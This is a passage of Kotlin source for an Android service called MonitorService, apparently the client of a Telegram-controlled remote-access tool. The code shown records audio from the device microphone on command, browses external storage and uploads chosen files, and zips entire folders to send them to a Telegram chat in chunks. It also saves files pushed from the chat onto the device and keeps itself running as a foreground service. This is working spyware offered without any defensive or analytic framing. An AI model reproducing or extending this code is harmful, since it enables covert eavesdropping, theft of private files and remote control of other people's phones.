            sendMessage(chatId, "${devicePrefix()}⚠️ RECORD_AUDIO permission not granted."); return
        }
        val duration = seconds.coerceIn(1, 120)
        sendMessage(chatId, "${devicePrefix()}🎙️ Recording ${duration}s audio…", parseMode = "Markdown")
        serviceScope.launch {
            val outFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            @Suppress("DEPRECATION")
            val recorder: android.media.MediaRecorder =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) android.media.MediaRecorder(this@MonitorService)
                else android.media.MediaRecorder()
            try {
                recorder.apply {
                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100); setAudioEncodingBitRate(128_000)
                    setOutputFile(outFile.absolutePath); prepare(); start()
                }
                delay(duration * 1_000L)
                recorder.stop(); recorder.release()
                if (!outFile.exists() || outFile.length() == 0L) { sendMessage(chatId, "${devicePrefix()}❌ Recording empty."); return@launch }
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("audio", outFile.name, outFile.readBytes().toRequestBody("audio/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("title", "Recording (${duration}s)").addFormDataPart("duration", duration.toString()).build()
                httpClient.newCall(Request.Builder().url(URL_SEND_AUDIO).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${devicePrefix()}❌ Upload failed: ${r.code}")
                }
            } catch (e: Exception) {
                sendMessage(chatId, "${devicePrefix()}❌ Recording error: ${e.message}")
                try { recorder.release() } catch (_: Exception) {}
            } finally { try { outFile.delete() } catch (_: Exception) {} }
        }
    }

    private fun handleFileMn(chatId: String, arg: String) {
        if (arg.isEmpty()) { showTopFolders(chatId); return }
        val parts  = arg.split(" ")
        val lastNum = parts.last().toIntOrNull()
        if (lastNum != null && parts.size >= 2) { sendFolderFile(chatId, lastNum); return }
        listFolderContents(chatId, arg)
    }

    private fun showTopFolders(chatId: String) {
        val root = Environment.getExternalStorageDirectory()
        val dirs = root.listFiles()?.filter { it.isDirectory }?.sortedBy { it.name.lowercase() } ?: emptyList()
        if (dirs.isEmpty()) { sendMessage(chatId, "${devicePrefix()}📁 No folders found."); return }
        val sb = StringBuilder("${devicePrefix()}📁 *Folders on device:*\n\n")
        dirs.forEach { dir ->
            sb.append("• `${dir.name}` — ${dir.listFiles()?.size ?: 0} items, ${formatSize(getFolderSize(dir))}\n")
        }
        sb.append("\n📂 `/filemn <folder>` to browse")
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun listFolderContents(chatId: String, folderPath: String) {
        val root   = Environment.getExternalStorageDirectory()
        val target = run {
            val direct = File(root, folderPath)
            if (direct.exists() && direct.isDirectory) return@run direct
            var current = root
            for (segment in folderPath.split("/")) {
                current = current.listFiles()?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory } ?: return@run null
            }
            current
        }
        if (target == null) { sendMessage(chatId, "${devicePrefix()}❌ Folder `$folderPath` not found.", parseMode = "Markdown"); return }
        val all     = target.listFiles() ?: emptyArray()
        val files   = all.filter { it.isFile && it.length() > 0 }.sortedByDescending { it.lastModified() }.take(30)
        val subDirs = all.filter { it.isDirectory }.sortedBy { it.name }
        if (files.isEmpty() && subDirs.isEmpty()) { sendMessage(chatId, "${devicePrefix()}📂 Folder empty.", parseMode = "Markdown"); return }
        folderFileCache[chatId] = files
        val sb = StringBuilder("${devicePrefix()}📂 *$folderPath/*\n\n")
        if (subDirs.isNotEmpty()) {
            sb.append("🗂 *Sub-folders:*\n")
            subDirs.forEach { d -> sb.append("  • `${d.name}` (${d.listFiles()?.size ?: 0} items, ${formatSize(getFolderSize(d))}) → `/filemn $folderPath/${d.name}`\n") }
            sb.append("\n")
        }
        if (files.isNotEmpty()) {
            sb.append("📄 *Files (${files.size}):*\n")
            files.forEachIndexed { i, f -> sb.append("${i+1}. `${f.name}` — ${formatSize(f.length())}\n") }
            sb.append("\n`/filemn $folderPath <number>` to download")
        }
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun sendFolderFile(chatId: String, number: Int) {
        val list = folderFileCache[chatId]
        if (list.isNullOrEmpty()) { sendMessage(chatId, "${devicePrefix()}⚠️ Use `/filemn <folder>` first.", parseMode = "Markdown"); return }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) { sendMessage(chatId, "${devicePrefix()}❌ Choose 1–${list.size}."); return }
        val file = list[idx]
        sendMessage(chatId, "${devicePrefix()}📤 Sending *${file.name}*…", parseMode = "Markdown")
        try {
            val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension.lowercase()) ?: "application/octet-stream"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", file.name, file.readBytes().toRequestBody(mime.toMediaTypeOrNull()))
                .addFormDataPart("caption", "📎 ${file.name}").build()
            httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${devicePrefix()}❌ Upload failed: ${r.code}")
            }
        } catch (e: Exception) { sendMessage(chatId, "${devicePrefix()}❌ Error: ${e.message}") }
    }

    private fun handleIncomingDocument(chatId: String, fileObj: JSONObject, fallbackName: String = "received_${System.currentTimeMillis()}") {
        val fileId   = fileObj.optString("file_id").ifEmpty { sendMessage(chatId, "${devicePrefix()}⚠️ No file_id."); return }
        val fileName = fileObj.optString("file_name").ifEmpty { fallbackName }
        sendMessage(chatId, "${devicePrefix()}💾 Saving *$fileName*…", parseMode = "Markdown")
        serviceScope.launch {
            try {
                val filePath = getTelegramFilePath(fileId) ?: run { sendMessage(chatId, "${devicePrefix()}❌ Cannot resolve file path."); return@launch }
                val bytes = httpClient.newCall(Request.Builder().url("$BASE_FILE_URL/$filePath").get().build()).execute().use { r ->
                    if (!r.isSuccessful) { sendMessage(chatId, "${devicePrefix()}❌ Download failed: ${r.code}"); return@launch }
                    r.body?.bytes() ?: run { sendMessage(chatId, "${devicePrefix()}❌ Empty response."); return@launch }
                }
                val mime  = MimeTypeMap.getSingleton().getMimeTypeFromExtension(fileName.substringAfterLast('.', "")) ?: "application/octet-stream"
                if (saveToDownloads(fileName, mime, bytes)) sendMessage(chatId, "${devicePrefix()}✅ *$fileName* saved to Downloads.", parseMode = "Markdown")
                else sendMessage(chatId, "${devicePrefix()}❌ Failed to write file.")
            } catch (e: Exception) { sendMessage(chatId, "${devicePrefix()}❌ Error: ${e.message}") }
        }
    }

    private fun getTelegramFilePath(fileId: String): String? {
        return try {
            val body = httpClient.newCall(Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build()).execute().use { it.body?.string() } ?: return null
            val json = JSONObject(body)
            if (!json.optBoolean("ok", false)) null else json.optJSONObject("result")?.optString("file_path")
        } catch (_: Exception) { null }
    }

    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE, mimeType)
                    put(MediaStore.Downloads.IS_PENDING, 1)
                }
                val uri = contentResolver.insert(MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY), values) ?: return false
                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
                values.clear(); values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                dir.mkdirs(); File(dir, fileName).writeBytes(bytes)
            }
            true
        } catch (_: Exception) { false }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  ZIP
    // ══════════════════════════════════════════════════════════════════════════

    private fun resolveFolder(root: File, folderPath: String): File? {
        val direct = File(root, folderPath)
        if (direct.exists() && direct.isDirectory) return direct
        var current = root
        for (segment in folderPath.split("/")) {
            current = current.listFiles()
                ?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory }
                ?: return null
        }
        return current
    }

    private fun getFolderSize(dir: File): Long { var t = 0L; dir.walkTopDown().forEach { if (it.isFile) t += it.length() }; return t }

    private fun formatSize(bytes: Long): String = when {
        bytes >= 1_073_741_824L -> "${"%.1f".format(bytes / 1_073_741_824.0)} GB"
        bytes >= 1_048_576L     -> "${"%.1f".format(bytes / 1_048_576.0)} MB"
        bytes >= 1_024L         -> "${"%.1f".format(bytes / 1_024.0)} KB"
        else                    -> "$bytes B"
    }

    private fun handleZipFolder(chatId: String, folderPath: String) {
        val target = resolveFolder(Environment.getExternalStorageDirectory(), folderPath)
        if (target == null) { sendMessage(chatId, "${devicePrefix()}❌ Folder `$folderPath` not found.", parseMode = "Markdown"); return }
        val allFiles = target.walkTopDown().filter { it.isFile }.toList()
        sendMessage(chatId, "${devicePrefix()}🗜️ Zipping `$folderPath`…\n📊 ${formatSize(allFiles.sumOf { it.length() })} (${allFiles.size} files)", parseMode = "Markdown")
        serviceScope.launch { zipAndSendInChunks(chatId, allFiles, baseName = target.name) }
    }

    private fun handleZipSelected(chatId: String, folderPath: String, numbers: List<Int>) {
        val cached = folderFileCache[chatId]
        if (cached.isNullOrEmpty()) { sendMessage(chatId, "${devicePrefix()}⚠️ Use `/filemn $folderPath` first.", parseMode = "Markdown"); return }
        val selected = mutableListOf<File>(); val invalid = mutableListOf<Int>()
        for (n in numbers) { val idx = n - 1; if (idx < 0 || idx >= cached.size) invalid.add(n) else selected.add(cached[idx]) }
        if (invalid.isNotEmpty()) sendMessage(chatId, "${devicePrefix()}⚠️ Invalid numbers: ${invalid.joinToString(", ")}")
        if (selected.isEmpty()) { sendMessage(chatId, "${devicePrefix()}❌ No valid files selected."); return }
        sendMessage(chatId, "${devicePrefix()}🗜️ Zipping ${selected.size} file(s)… ${formatSize(selected.sumOf { it.length() })}")
        serviceScope.launch { zipAndSendInChunks(chatId, selected, baseName = "selected_${folderPath.replace("/","_")}") }
    }

    private fun zipAndSendInChunks(chatId: String, files: List<File>, baseName: String) {
        val chunkLimit = 49L * 1_048_576L
        val chunks = mutableListOf<MutableList<File>>()
        var current = mutableListOf<File>(); var currentSize = 0L
        for (file in files) {
            val size = file.length()
            if (size > chunkLimit) { sendMessage(chatId, "${devicePrefix()}⚠️ Skipped `${file.name}` — ${formatSize(size)} > 49 MB.", parseMode = "Markdown"); continue }
            if (currentSize + size > chunkLimit && current.isNotEmpty()) { chunks.add(current); current = mutableListOf(); currentSize = 0L }
            current.add(file); currentSize += size
        }
        if (current.isNotEmpty()) chunks.add(current)
        if (chunks.isEmpty()) { sendMessage(chatId, "${devicePrefix()}❌ No files to ZIP."); return }
        val total = chunks.size
        chunks.forEachIndexed { index, chunkFiles ->
            val partLabel = if (total > 1) "_part${index+1}of$total" else ""
            val zipFile   = File(cacheDir, "${baseName}${partLabel}_${System.currentTimeMillis()}.zip")
            if (total > 1) sendMessage(chatId, "${devicePrefix()}📦 Building part ${index+1}/$total…")
            try {
                java.util.zip.ZipOutputStream(zipFile.outputStream().buffered()).use { zos ->
                    for (file in chunkFiles) {
                        try { zos.putNextEntry(java.util.zip.ZipEntry(file.name)); file.inputStream().use { it.copyTo(zos) }; zos.closeEntry() }
                        catch (_: Exception) {}
                    }
                }
                if (!zipFile.exists() || zipFile.length() == 0L) { sendMessage(chatId, "${devicePrefix()}❌ ZIP part ${index+1} empty."); return@forEachIndexed }
                val caption = if (total > 1) "📦 $baseName — Part ${index+1}/$total (${formatSize(zipFile.length())})" else "📦 $baseName.zip (${formatSize(zipFile.length())})"
                sendMessage(chatId, "${devicePrefix()}⬆️ Uploading $caption…")
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", zipFile.name, zipFile.readBytes().toRequestBody("application/zip".toMediaTypeOrNull()))
                    .addFormDataPart("caption", caption).build()
                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${devicePrefix()}❌ Upload failed part ${index+1}: ${r.code}")
                }
            } catch (e: Exception) { sendMessage(chatId, "${devicePrefix()}❌ Error part ${index+1}: ${e.message}") }
            finally { try { zipFile.delete() } catch (_: Exception) {} }
        }
        if (total > 1) sendMessage(chatId, "${devicePrefix()}✅ All $total parts sent!")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  NOTIFICATION & HTTP HELPERS
    // ══════════════════════════════════════════════════════════════════════════

    private fun startForegroundWithNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification = NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle(getString(R.string.notif_title))
            .setContentText("[$deviceNumber] $deviceName — Active")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true).setContentIntent(pendingIntent).build()
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
        try {
            val json = JSONObject().apply {
                put("chat_id", chatId); put("text", text)
                if (parseMode != null) put("parse_mode", parseMode)
            }
            val body    = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder().url(URL_SEND_MSG).post(body).build()
            httpClient.newCall(request).execute().use { r ->
                if (!r.isSuccessful) Log.w(TAG, "sendMessage failed: ${r.code}")
            }
        } catch (e: Exception) { Log.e(TAG, "sendMessage exception: ${e.message}") }
    }

    private fun sendPhoto(chatId: String, photoFile: File) {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", "${devicePrefix()}📸 ${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}")
                .addFormDataPart("photo", photoFile.name, photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())).build()
            httpClient.newCall(Request.Builder().url(URL_SEND_PHOTO).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${devicePrefix()}❌ Photo upload failed: ${r.code}")
            }
        } catch (e: Exception) { sendMessage(chatId, "${devicePrefix()}❌ Photo exception: ${e.message}") }
    }
}
